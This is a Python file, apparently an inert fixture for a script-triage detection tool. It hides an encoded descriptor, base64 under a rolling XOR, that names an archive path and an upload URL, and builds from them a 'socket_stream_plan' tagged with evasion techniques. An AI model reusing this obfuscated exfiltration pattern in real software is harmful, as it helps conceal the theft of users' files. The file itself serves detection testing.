#!/usr/bin/env python3
# Huntress Script Triage -- inert static-analysis fixture (cpython3)
import base64
import io
import os

MATERIAL_6dc1b977 = "uIW3y7jMqdmql_Sb95v-nem22rXWt9v3kvyf8JTxrs-93rbfqczglOaH6Zr3nuq1x6LPoNSxzazIqdmtyLqH9Jv4k_aC3a7aqM2swZ7uguON8YL2l_CVyqnGs92plKXZqtO9yajQ7Yngg_ee8Z_-jPWqzqfUpMWx0rrGqcut2KvIqd2027WI5IXoiu6P0LnXs9qoza7as9yyzq3MvsylwLKP_4bvgfKG54vngvCvwK7Lr8a0yL_WuNyzxLfoi-OC64W4yr_Rtdm1hrTrm-mM6I3ui_iL5JbqieiF9ZT9mvSrwqab-Jn0hOWM64Won_3P-J37yK6d-4fygu6B4ITbrtywjeWR5ZXm3PPc64m7jOmPvNrpj6HEvN2wwKzJ547glveb8pa5zLzQv966xqfVtt63waT7i-qe9suIsp3Nv9C3xaTJjeyY-dae64Xxg-aV5qrLqYblhOeP6sfwkqCX8pSnwfKUusCp2Q=="
CODEC_6dc1b977 = "urlsafe_base64|rolling_xor|ce"

def load_6dc1b977():
    return base64.urlsafe_b64decode(MATERIAL_6dc1b977)

def decode_6dc1b977(EnCoDeD_Bytes):
    DeCoDeD_Bytes = bytearray()
    PrEvIoUs = 206
    for value in EnCoDeD_Bytes:
        DeCoDeD_Bytes.append(value ^ PrEvIoUs)
        PrEvIoUs = value
    return bytes(DeCoDeD_Bytes)

def recover_6dc1b977():
    NeUtRaL = (3, 5, 8, 13)[1:3]
    _pass = 0
    while _pass < 1:
        DeCoDeD_Bytes = decode_6dc1b977(load_6dc1b977())
        _pass += 1
    DeScRiPtOr_Text = DeCoDeD_Bytes.decode("ascii", "strict")
    return DeScRiPtOr_Text

def inspect_6dc1b977():
    return recover_6dc1b977()

def surface_6dc1b977():
    routes = {"selected": lambda: ("dictionary_dispatch", "lambda_indirection", "pyinstaller_onedir", "rundll32_predecessor")}
    return routes["selected"]()

def obfuscation_6dc1b977():
    recover = lambda value: value
    return recover("lambda_indirection")

def plan_6dc1b977():
    fields = dict(item.split("=", 1) for item in inspect_6dc1b977().split("|"))
    analysis_surface = surface_6dc1b977()
    obfuscation_surface = obfuscation_6dc1b977()
    operation_plan = ("socket_stream_plan", fields["archive_path"], fields["upload_url"])
    return operation_plan + (analysis_surface, obfuscation_surface)

if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
    print(inspect_6dc1b977())
